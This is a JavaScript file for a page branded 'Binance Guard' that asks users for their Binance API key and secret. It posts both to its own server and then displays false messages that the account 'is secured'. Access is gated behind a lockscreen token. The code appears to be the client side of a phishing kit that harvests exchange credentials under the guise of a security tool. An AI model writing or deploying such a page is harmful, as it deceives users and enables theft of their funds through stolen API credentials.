// Constants
const STORAGE_KEY = 'access0214';
const ACCESS_TIMEOUT = 3600000; // 1 hour in milliseconds

// Utils
const $ = (selector) => document.querySelector(selector);
const $$ = (selector) => document.querySelectorAll(selector);

class BinanceGuard {
  constructor() {
    this.form = $('#apiForm');
    this.submitBtn = $('.submit-btn');
    this.loading = $('#loading');
    this.btnText = this.submitBtn.querySelector('span');
    this.messageContainer = document.createElement('div');
    
    this.init();
  }

  init() {
    this.setupMessageContainer();
    this.setupFormValidation();
    this.setupInputAnimations();
    this.checkAccess();
    this.setupAutoLogout();
  }

  setupMessageContainer() {
    this.messageContainer.className = 'message';
    this.form.appendChild(this.messageContainer);
  }

  showMessage(message, type = 'info') {
    this.messageContainer.textContent = message;
    this.messageContainer.className = `message message-${type}`;
    this.messageContainer.style.display = 'block';

    if (type === 'success') {
      setTimeout(() => {
        this.messageContainer.style.display = 'none';
      }, 5000);
    }
  }

  setupFormValidation() {
    this.form.addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const formData = new FormData(this.form);
      formData.set('timestamp', new Date().toISOString());

      if (!this.validateForm(formData)) return;

      await this.submitForm(formData);
    });
  }

  validateForm(formData) {
    const apiKey = formData.get('apiKey').trim();
    const apiSecret = formData.get('apiSecret').trim();

    if (!apiKey || !apiSecret) {
      this.showMessage('Please fill in all fields', 'error');
      return false;
    }

    const keyRegex = /^[A-Za-z0-9]{10,100}$/;
    if (!keyRegex.test(apiKey) || !keyRegex.test(apiSecret)) {
      this.showMessage('Invalid API key format. Use only letters and numbers, length 10-100.', 'error');
      return false;
    }

    return true;
  }

  async submitForm(formData) {
    this.setLoadingState(true);

    try {
      const response = await fetch('/', {
        method: 'POST',
        body: formData,
        headers: {
          'Accept': 'application/json'
        }
      });

      if (!response.ok) throw new Error('Submission failed');

      this.handleSuccess();
    } catch (error) {
      this.handleError(error);
    }
  }

  setLoadingState(isLoading) {
    this.loading.style.display = isLoading ? 'inline-block' : 'none';
    this.btnText.textContent = isLoading ? 'Connecting...' : 'Activate Binance Guard';
    this.submitBtn.disabled = isLoading;
  }

  handleSuccess() {
    this.setLoadingState(false);
    this.btnText.textContent = 'Keys validated! Your account is secured.';
    this.submitBtn.style.background = 'linear-gradient(135deg, #22c55e, #16a34a)';
    this.showMessage('API keys successfully secured!', 'success');
    this.form.reset();

    setTimeout(() => {
      this.btnText.textContent = 'Activate Binance Guard';
      this.submitBtn.style.background = '';
    }, 3000);
  }

  handleError(error) {
    this.setLoadingState(false);
    this.showMessage('Error submitting form. Please try again.', 'error');
    console.error('Submission error:', error);

    setTimeout(() => {
      this.btnText.textContent = 'Activate Binance Guard';
      this.submitBtn.style.background = '';
    }, 3000);
  }

  setupInputAnimations() {
    $$('input').forEach(input => {
      input.addEventListener('focus', () => {
        input.parentElement.style.transform = 'scale(1.01)';
        input.parentElement.style.transition = 'transform 0.2s ease';
      });

      input.addEventListener('blur', () => {
        input.parentElement.style.transform = '';
        input.parentElement.style.transition = '';
      });
    });
  }

  checkAccess() {
    const hasAccess = localStorage.getItem(STORAGE_KEY);
    const accessTime = localStorage.getItem(`${STORAGE_KEY}_time`);
    const currentTime = Date.now();

    if (!hasAccess || !accessTime || (currentTime - parseInt(accessTime)) > ACCESS_TIMEOUT) {
      this.logout();
    } else {
      $('#mainContent').style.display = 'block';
      localStorage.setItem(`${STORAGE_KEY}_time`, currentTime.toString());
    }
  }

  setupAutoLogout() {
    setInterval(() => this.checkAccess(), 5000);
  }

  logout() {
    localStorage.removeItem(STORAGE_KEY);
    localStorage.removeItem(`${STORAGE_KEY}_time`);
    window.location.replace('lockscreen.html');
  }
}

// Initialize on DOM load
document.addEventListener('DOMContentLoaded', () => {
  new BinanceGuard();
});

// Password toggle function
window.togglePassword = function() {
  const passwordInput = $('#apiSecret');
  const toggleIcon = $('#toggleIcon');
  
  const newType = passwordInput.type === 'password' ? 'text' : 'password';
  passwordInput.type = newType;
  
  toggleIcon.classList.toggle('fa-eye');
  toggleIcon.classList.toggle('fa-eye-slash');
};